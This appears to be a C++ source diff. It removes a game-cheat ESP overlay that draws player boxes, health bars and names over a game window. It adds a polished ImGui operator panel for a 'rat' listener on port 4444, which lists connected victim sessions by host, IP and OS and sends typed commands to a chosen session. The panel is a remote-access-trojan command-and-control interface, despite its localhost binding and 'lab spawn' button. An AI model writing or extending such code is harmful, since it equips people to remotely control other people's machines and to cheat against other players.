-        overlay.draw_rect(
-            screen.x - box_w * 0.5f,
-            screen.y - box_h,
-            box_w,
-            box_h,
-            brush, 1.0f);
-
-        float hp = e.health > 200.0f ? 200.0f : e.health;
-        if (hp < 0) hp = 0;
-        float bar_h = box_h * (hp / 200.0f);
-        overlay.fill_rect(
-            screen.x - box_w * 0.5f - 5.0f,
-            screen.y - bar_h,
-            3.0f,
-            bar_h,
-            overlay.brush_green());
-
-        wchar_t label[64];
-        const char* nm = e.name[0] ? e.name : (e.is_player ? "player" : "ped");
-        swprintf(label, 64, L"%hs [%.0fm]", nm, e.distance);
-        overlay.draw_text(
-            screen.x - box_w * 0.5f,
-            screen.y - box_h - 16.0f,
-            label,
-            overlay.brush_white());
-    }
-
-    overlay.end_frame();
+inline bool BeginCard(const char* id, ImVec2 size, ImVec4 accent=theme::accent){
+    ImGui::PushStyleColor(ImGuiCol_ChildBg, theme::bg_card);
+    ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 12);
+    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, {16,16});
+    bool open = ImGui::BeginChild(id, size, true, ImGuiWindowFlags_NoScrollbar);
+    ImDrawList* dl = ImGui::GetWindowDrawList();
+    ImVec2 p = ImGui::GetWindowPos();
+    dl->AddRectFilledMultiColor(p,{p.x+size.x,p.y+2},
+        theme::col(accent,0),theme::col(accent,1),
+        theme::col(accent,1),theme::col(accent,0));
+    return open;
+}
+inline void EndCard(){
+    ImGui::EndChild();
+    ImGui::PopStyleVar(2);
+    ImGui::PopStyleColor();
 }
 
-// ---------- window ----------
-static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
-    switch (msg) {
-    case WM_ERASEBKGND:
-        return 1;
-    case WM_DESTROY:
-        g_running = false;
-        PostQuitMessage(0);
-        return 0;
+struct Toast {
+    std::string msg; ImVec4 color; float life=0, max_life=3; bool alive=true;
+    void update(float dt){ life+=dt; if (life>=max_life) alive=false; }
+    void draw(int idx){
+        float t_in  = anim::ease_out_back(std::min(life/0.35f,1.f));
+        float t_out = anim::ease_out_cubic(std::min(std::max((life-(max_life-0.4f))/0.4f,0.f),1.f));
+        float alpha = 1.f - t_out;
+        float slide = (1.f-t_in)*60.f;
+        ImGuiIO& io = ImGui::GetIO();
+        ImVec2 sz{320,56};
+        ImVec2 p{io.DisplaySize.x-sz.x-24+slide, io.DisplaySize.y-24-(sz.y+12)*(idx+1)+slide};
+        ImDrawList* dl = ImGui::GetForegroundDrawList();
+        dl->AddRectFilled({p.x+4,p.y+4},{p.x+sz.x+4,p.y+sz.y+4},theme::col({0,0,0,1},0.35f*alpha),10);
+        dl->AddRectFilled(p,{p.x+sz.x,p.y+sz.y},theme::col(theme::bg_card,alpha),10);
+        dl->AddRect(p,{p.x+sz.x,p.y+sz.y},theme::col(color,0.6f*alpha),10,0,1.5f);
+        dl->AddRectFilled(p,{p.x+4,p.y+sz.y},theme::col(color,alpha),10,ImDrawFlags_RoundCornersLeft);
+        dl->AddText({p.x+18,p.y+20},theme::col(theme::text,alpha),msg.c_str());
     }
-    return DefWindowProcW(hwnd, msg, wp, lp);
-}
+};
 
-int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
-    WNDCLASSEXW wc{ sizeof(wc) };
-    wc.style = CS_HREDRAW | CS_VREDRAW;
-    wc.lpfnWndProc = wnd_proc;
-    wc.hInstance = hInst;
-    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
-    wc.hbrBackground = nullptr;
-    wc.lpszClassName = kWindowClass;
-    RegisterClassExW(&wc);
+} // namespace ui
 
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
+// ═════════════════════════════════════════════════════════
+// APP
+// ═════════════════════════════════════════════════════════
+struct App {
+    int page = 0;
+    int selected = -1;
+    ui::SidebarItem sidebar[4];
+    ui::AnimatedButton btn_refresh, btn_send, btn_labspawn;
+    anim::Pulse pulse;
+    std::vector<ui::Toast> toasts;
+    rat::Listener listener{4444};
+    std::string cmd_input;
+    std::vector<std::string> console_lines;
 
-    g_overlay = CreateWindowExW(
-        WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED,
-        kWindowClass, L"esp", WS_POPUP,
-        0, 0, sw, sh,
-        nullptr, nullptr, hInst, nullptr);
+    App(){
+        if (listener.start()) toast("listener bound to 127.0.0.1:4444", theme::success);
+        else                  toast("listener failed to bind", theme::danger);
+        console_lines.push_back("[*] ready. sessions appear when peers connect.");
+    }
+    ~App(){ listener.stop(); }
 
-    if (!g_overlay) return 1;
-
-    ShowWindow(g_overlay, SW_SHOW);
-
-    D2DOverlay overlay;
-    if (!overlay.init(g_overlay, sw, sh)) {
-        MessageBoxW(nullptr, L"D2D init failed", L"err", MB_OK);
-        return 1;
+    void toast(const std::string& m, ImVec4 c){ toasts.push_back({m,c,0,3,true}); }
+    void tick_toasts(float dt){
+        for (auto& t : toasts) t.update(dt);
+        toasts.erase(std::remove_if(toasts.begin(),toasts.end(),
+            [](const ui::Toast& t){return !t.alive;}), toasts.end());
     }
 
-    std::thread esp(esp_thread);
+    void draw_sidebar(float dt){
+        ImGui::PushStyleColor(ImGuiCol_ChildBg, theme::bg_panel);
+        ImGui::BeginChild("##side", {220,0}, true);
+        ImGui::Dummy({0,8});
+        ui::TextGlow("LNW", theme::accent, 0.6f);
+        ImGui::TextColored(theme::text_dim, "control surface");
+        ImGui::Dummy({0,24});
 
-    MSG msg{};
-    while (g_running) {
-        while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
-            if (msg.message == WM_QUIT) g_running = false;
-            TranslateMessage(&msg);
-            DispatchMessageW(&msg);
+        const char* icons[4] = {"◇","◆","▣","⚙"};
+        const char* names[4] = {"dashboard","sessions","console","settings"};
+        for (int i=0;i<4;++i){
+            if (sidebar[i].draw(icons[i], names[i], page==i, dt))
+                page = i;
         }
 
-        render_frame(overlay, sw, sh);
+        ImGui::SetCursorPosY(ImGui::GetWindowHeight()-70);
+        ImGui::TextColored(theme::text_dim, "port %u", listener.port());
+        float p = pulse.value();
+        ImVec4 dot = theme::lerp(theme::success, theme::accent, p);
+        ImGui::TextColored(dot, "● listening");
+
+        ImGui::EndChild();
+        ImGui::PopStyleColor();
     }
 
-    g_running = false;
-    esp.join();
-    detach_process();
+    void draw_dashboard(float dt){
+        auto sessions = listener.snapshot();
+        int total = (int)sessions.size();
+        int online = 0; float avg_cpu=0, avg_ram=0;
+        for (auto& s : sessions){ if (s.alive){ online++; avg_cpu+=s.cpu; avg_ram+=s.ram; } }
+        if (online){ avg_cpu/=online; avg_ram/=online; }
 
-    DestroyWindow(g_overlay);
-    return 0;
-}
+        ui::BeginCard("stats", {0,120}, theme::accent);
+        ImGui::TextColored(theme::text_dim, "OVERVIEW");
+        ImGui::Spacing();
+        auto stat = [](const char* lbl, const std::string& v, ImVec4 c){
+            ImGui::BeginGroup();
+            ui::TextGlow(v.c_str(), c, 0.6f);
+            ImGui::TextColored(theme::text_dim, "%s", lbl);
+            ImGui::EndGroup();
+            ImGui::SameLine(0, 60);
+        };
+        stat("total",   std::to_string(total),        theme::accent);
+        stat("online",  std::to_string(online),       theme::success);
+        stat("offline", std::to_string(total-online), theme::danger);
+        char b[32]; snprintf(b,32,"%.0f%%", avg_cpu*100);
+        stat("avg cpu", b, theme::warn);
+        ui::EndCard();
+        ImGui::Spacing();
+
+        float half = ImGui::GetContentRegionAvail().x*0.5f - 5;
+        ui::BeginCard("res", {half, 220}, theme::accent2);
+        ImGui::TextColored(theme::text_dim, "AGGREGATE");
+        ImGui::Spacing();
+        ui::ProgressGlow("CPU", avg_cpu, theme::accent);  ImGui::Spacing();
+        ui::ProgressGlow("RAM", avg_ram, theme::success); ImGui::Spacing();
+        float net = 0.3f + 0.4f*std::sin(ImGui::GetTime()*1.7f);
+        ui::ProgressGlow("NET", net, theme::accent2);
+        ui::EndCard();
+
+        ImGui::SameLine();
+
+        ui::BeginCard("event", {0, 220}, theme::warn);
+        ImGui::TextColored(theme::text_dim, "EVENT LOG");
+        ImGui::Spacing();
+        ImGui::PushStyleColor(ImGuiCol_ChildBg, {0,0,0,0.25f});
+        ImGui::BeginChild("##ev", {0,0}, true, ImGuiWindowFlags_AlwaysVerticalScrollbar);
+        for (auto& s : sessions)
+            for (auto& l : s.log)
+                ImGui::TextColored(theme::text_dim, "[%d] %s", s.id, l.c_str());
+        ImGui::SetScrollHereY(1.f);
+        ImGui::EndChild();
+        ImGui::PopStyleColor();
+        ui::EndCard();
+    }
+
+    void draw_sessions(float dt){
+        ui::BeginCard("clients", {0,0}, theme::accent);
+        ImGui::TextColored(theme::text_dim, "ACTIVE SESSIONS");
+        ImGui::SameLine(ImGui::GetContentRegionAvail().x - 240);
+        if (btn_refresh.draw("refresh", {110,32}, theme::accent, dt))
+            toast("session list refreshed", theme::accent);
+        ImGui::SameLine();
+        if (btn_labspawn.draw("lab spawn", {110,32}, theme::accent2, dt))
+            toast("spawn a peer on 127.0.0.1:4444 to appear here", theme::accent2);
+        ImGui::Spacing();
+
+        auto sessions = listener.snapshot();
+        const ImGuiTableFlags tf = ImGuiTableFlags_RowBg | ImGuiTableFlags_BordersInnerH |
+                                   ImGuiTableFlags_SizingStretchProp | ImGuiTableFlags_ScrollY;
+        if (ImGui::BeginTable("##tbl", 6, tf, {0,-1})){
+            ImGui::TableSetupColumn("ID", ImGuiTableColumnFlags_WidthFixed, 40);
+            ImGui::TableSetupColumn("HOST");
+            ImGui::TableSetupColumn("IP");
+            ImGui::TableSetupColumn("OS");
+            ImGui::TableSetupColumn("CC", ImGuiTableColumnFlags_WidthFixed, 40);
+            ImGui::TableSetupColumn("STATE", ImGuiTableColumnFlags_WidthFixed, 100);
+            ImGui::TableHeadersRow();
+
+            for (auto& s : sessions){
+                ImGui::TableNextRow();
+                ImGui::TableSetColumnIndex(0); ImGui::Text("%d", s.id);
+                ImGui::TableSetColumnIndex(1);
+                bool sel = (selected==s.id);
+                if (ImGui::Selectable(s.host.c_str(), sel, ImGuiSelectableFlags_SpanAllColumns))
+                    selected = s.id;
+                ImGui::TableSetColumnIndex(2); ImGui::TextColored(theme::text_dim,"%s",s.ip.c_str());
+                ImGui::TableSetColumnIndex(3); ImGui::TextColored(theme::text_dim,"%s",s.os.c_str());
+                ImGui::TableSetColumnIndex(4); ImGui::Text("%s", s.cc.c_str());
+                ImGui::TableSetColumnIndex(5); {
+                    float p = pulse.value();
+                    ImVec4 c = s.alive ? theme::lerp(theme::success, theme::accent, p) : theme::danger;
+                    ImGui::TextColored(c, "%s", s.alive ? "● online" : "○ offline");
+                }
+            }
+            ImGui::EndTable();
+        }
+        ui::EndCard();
+    }
+
+    void draw_console(float dt){
+        ui::BeginCard("con", {0,0}, theme::accent2);
+        ImGui::TextColored(theme::text_dim, "COMMAND CONSOLE");
+        ImGui::Spacing();
+
+        ImGui::PushStyleColor(ImGuiCol_ChildBg, {0,0,0,0.25f});
+        ImGui::BeginChild("##scroll", {0,-50}, true, ImGuiWindowFlags_AlwaysVerticalScrollbar);
+        for (auto& l : console_lines)
+            ImGui::TextUnformatted(l.c_str());
+        ImGui::SetScrollHereY(1.f);
+        ImGui::EndChild();
+        ImGui::PopStyleColor();
+
+        ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x - 130);
+        bool enter = ImGui::InputText("##cmd", &cmd_input,
+            ImGuiInputTextFlags_EnterReturnsTrue);
+        ImGui::SameLine();
+        bool send = btn_send.draw("send", {110,36}, theme::accent, dt);
+
+        if ((enter || send) && !cmd_input.empty()){
+            if (selected < 0){
+                toast("select a session first", theme::danger);
+                console_lines.push_back("[!] no session selected");
+            } else {
+                listener.send_cmd(selected, cmd_input);
+                console_lines.push_back("[>] queued to #" + std::to_string(selected) + ": " + cmd_input);
+                toast("command queued", theme::accent);
+            }
+            cmd_input.clear();
+        }
+       
